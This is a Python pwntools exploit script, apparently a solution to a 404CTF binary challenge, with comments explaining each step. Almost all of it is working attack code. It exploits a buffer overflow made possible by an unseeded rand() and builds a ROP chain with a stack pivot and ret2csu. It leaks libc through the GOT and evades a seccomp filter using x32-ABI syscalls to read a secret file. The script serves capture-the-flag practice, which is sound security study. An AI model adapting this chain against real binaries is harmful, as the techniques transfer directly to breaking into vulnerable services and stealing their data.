from pwn import *

p = remote('challenge.404ctf.fr', 30863)

libc = ELF('libc-2.27.so')
offset = libc.symbols['perror']
open_sys = libc.symbols['syscall']

bss = 0x404100
read = 0x4010a0
write = 0x401090
rand = 0x4010e0
fini = 0x00403db0
ret2csu = 0x00401620
got_perror = 0x403fd8

leave = 0x0000000000401267 # leave; ret;
pop_rdi = 0x0000000000401643 # pop rdi; ret;
pop_rsi_r15 = 0x0000000000401641 # pop rsi; pop r15; ret;
pop_rbp = 0x00000000004011bd # pop rbp; ret;
pop_rbx_rbp_r12_r13_r14_r15 = 0x000000000040163a # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
ret = 0x000000000040101a # ret;
edx = 0x000000000040152c # mov edx, 0x64207a65; ret;

### FIRST PART ###

# Buffer overflow occurs when we have the good "password" 

# Our two buffers ( name and passwords ) are contiguous in memory, so the check in for's check
# function will not be passed and we will continue in the for loop to overwrite bytes in memory 

# The data and key buffers are supposed to be random, but no seed are given before
# rand function is called, so rand() will return the same number at every run

# Data is the buffer that will be xored with our input
data = "\xc7\x73\xff\xed\xcd\xab\xfb\x47\xc3\xf9\xe9\x8d\x5b\x63\x9f\x9b\x33\xb7\x59\x5b\x5d\x17\xe9\xd5\xb3\xc7\xb5\x11\x83\x41\x3d\x87\xe9\xa1\xe1\x67\x01\x97\xdd\x97\x39\x2b\xb1\xfb\xaf\x55\x19\x5d\x1b\x43\xfb\x3b\x29\xe7\x3d\x95\xd9\x61\xf9\xbb\x99\x95\xeb\xb3\xef\x01\xa1\xe5\x0b\xd1\x47\xbd\x23\xa9\x7b\xc5\x73\xc5\x4b\x63\x71\x25\x9f\xdd\xd5\xf3\x11\x3b\xcd\x51\x47\x5d\x6f\x19\x9b\xf5\xe1\x1d\x23\x29\xa5\x13\xcb\xe9\x33\xe1\x4d\x35\x5f\x77\xcb\x05\x87\x2b\x1b\xa3\x71\x73\x05\xd3\x95\xaf\xf1\x9f\x33\x49\x83\xa9\x67\x69\x51\x4a\x29\xba\xf2\xe3\x7c\x54\x1b\xe7\x76\x2e\x33\xc9\x66\x0d\x31\xa3\x25\x05\x58\x5e\xab\xcd\x9b\x54\x0e\x74\x21\xdc"

# Key is the buffer that will be compared with our xored input
key = "\x67\x69\x51\x4a\x29\xba\xf2\xe3\x7c\x54\x1b\xe7\x76\x2e\x33\xc9\x66\x0d\x31\xa3\x25\x05\x58\x5e\xab\xcd\x9b\x54\x0e\x74\x21\xdc\x70\x3e" 

# s_payload contains the key to triggers the buffer overflow
# f_payload contains our exploit

# Padding
f_payload = "B" * 8
# We overwrite function's for counter with a good number to overwrite eip
f_payload += "\x37"
# Padding
f_payload += "D" * 0xf

# We want to read an other payload and stores it in bss for stack pivoting
# because we have no enough space here

# set rdi to 0 (stdin)
f_payload += p64(pop_rdi)
f_payload += p64(0)

# set rsi to an address in bss
f_payload += p64(pop_rsi_r15)
f_payload += p64(bss)
f_payload += "OSEFOSEF"

# set edx to a value different than 0
f_payload += p64(edx)

# call to read
f_payload += p64(read)

# set rbp to bss - 8, because leave will pop rbp when it will changes the stack frame
f_payload += p64(pop_rbp)
f_payload += p64(bss - 8)

# We must add a ret here because the current 8 bytes of data contains one byte equal to leave's adresse
# byte, so the result of xor will be 0 and the for loop will stop
f_payload += p64(ret)

# Leave -> stack pivot, we jump to our other exploit (*)
f_payload += p64(leave)

# Xor our payload with data, for cancel the xor in for loop + padding    
f_payload = xor(f_payload, data[32:])[:len(f_payload)] + "A" * (0x80 - len(f_payload))
p.send(f_payload)                                                                                  

sleep(1)                                                                       

# Send the good password                                                                  
s_payload = data[:32]                                                        
p.send(xor(s_payload, key)[:0x20])                                              

############################################                                                  

# In this part, we will leak libc address and write in bss
# name of the file we want to read
# You can see that i write the exact name of flag file but during
# the challenge i didn't know it
# To get the name, i read the file /proc/mounts, in which you can
# see the filename of the binary and the flag file. For that, i used
# the same method as below ( for the real flag file )


# First, we want to ret2csu for setting rdx to a good value for write function

# (*)

# Set the different registers with godd values
final = p64(pop_rbx_rbp_r12_r13_r14_r15)

# rbx must be rbp - 1 for ret2csu
final += p64(0)
final += p64(1)

final += "OSEFOSEF"
final += "OSEFOSEF"

# r14 -> value we want for rdx ( we put a big number because we will reuse rdx for write
# an other payload
final += p64(512)
# r15 -> pointer to fini function ( it does nothing, just ret )
final += p64(fini)

# ret2csu
final += p64(ret2csu)

# We use the padding necessary for ret2csu for write the name of the file we want to read in bss ( bss + 64 )
filename = "/app/contenu_ultra_secret_du_coffre_fort.txt\x00"
final += filename
# Rest of the padding
final += "A" * (56 - len(filename))

# We write bytes from got in stdout, we leak the libc

# Set rdi to 1 ( stdout )
final += p64(pop_rdi)
final += p64(1)

# set rsi to adress of perror in got
final += p64(pop_rsi_r15)
final += p64(got_perror)
final += "OSEFOSEF"

# We call write, it will be write 512 bytes from perror adress in got to stdout
final += p64(write)

# Now we want to read for write a new payload using libc

# set rdi to 0 (stdin)
final += p64(pop_rdi)
final += p64(0)

# set rsi to address just after our current payload ( no need to stack pivot )
final += p64(pop_rsi_r15)
final += p64(bss + len(final) + 0x18)
final += "OSEFOSEF"

# call to read
final += p64(read)

p.read(timeout=0.4)
sleep(1)
p.send(final)

# Leak the libc and get function syscall and different useful gadgets
leak = p.read(timeout=0.2)
leak_libc = unpack(leak[:8], 'all', endian='little', sign=False)
base_libc = leak_libc - offset
syscall = base_libc + open_sys

pop_rdx = base_libc + 0x0000000000001b96 # pop rdx; ret;
pop_rcx = base_libc + 0x000000000010c423 # pop rcx; ret;
eax_to_esi = base_libc + 0x00000000000ef61d # xchg eax, esi;

sleep(1)

# FINAL PAYLOAD

# We will call open using x32 ABI, because of seccomp whitelist.
# The filters accept syscall > 0x14c, so we use x32 ABI ( starting at 0x40000000 )
# for open syscall

boss = ""

# Set rdi to open syscall in x32 ABI
boss += p64(pop_rdi)
boss += p64(0x40000002)

# Set rsi to bss + 64 ( where we stored the filename )
boss += p64(pop_rsi_r15)
boss += p64(bss + 64)
boss += "OSEFOSEF"

# Set rdx to 0 (O_RDONLY )
boss += p64(pop_rdx)
boss += p64(0)

# Call to syscall function
boss += p64(syscall)


# Set rdi to 0 ( read syscall )
boss += p64(pop_rdi)
boss += p64(0)

# Change eax and esi, fd returned by open is now in esi (rsi) 
boss += p64(eax_to_esi)

# We put an adress in bss in rdx ( where content of file will be write )
boss += p64(pop_rdx)
boss += p64(bss + 0x300)

# We put the length we want to read in rcx 
boss += p64(pop_rcx)
boss += p64(1024)

# Call to syscall
boss += p64(syscall)


# 1 in rdi ( stdout )
boss += p64(pop_rdi)
boss += p64(1)

# address of file's content in rsi
boss += p64(pop_rsi_r15)
boss += p64(bss + 0x300)
boss += "OSEFOSEF"

# length in rdx
boss += p64(pop_rdx)
boss += p64(64)

# Call to write
boss += p64(write)

p.send(boss)

# GET THE FLAG

p.interactive()
